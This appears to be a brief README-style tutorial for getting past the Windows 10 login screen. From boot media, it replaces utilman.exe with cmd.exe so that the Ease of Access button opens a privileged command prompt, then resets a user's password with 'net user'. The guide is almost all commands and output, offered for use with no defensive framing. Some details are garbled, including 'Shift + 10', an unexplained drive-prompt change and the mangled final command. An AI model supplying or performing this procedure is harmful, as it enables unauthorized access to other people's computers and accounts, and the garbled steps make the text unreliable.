<h1 align="center">Bypass Windows Login Screen</h1>


## Requirement

A Computer, Bootable USB for Windows 10

## Steps

1. Restart and hit Shift + 10

2. X: \Sources>
```bash
wmic logicaldisk get name
```

Output:
    Name
    C:
    D:
    E:
    X:


3. X: \Sources>
```bash
C:
#the directory which comtains your system files
```


4. C: \>
```bash
dir
```

Output:
Volume in drive C is System Reserved
Volume Serial Number is 56E1-426F

Directory of C:\
    File Not Found


5. E: \>
```bash
D:
```


6. D: \>
```bash
cd Windows
```


7. D: \Windows>
```bash
cd System32
```


8. D: \Windows\System32>
```bash
ren utilman.exe utilman2.exe
```


9. D: \Windows\System32>
```bash
copy cmd.exe utilman.exe
```


10. Click Ease of Access - cmd will open

11. net user may password
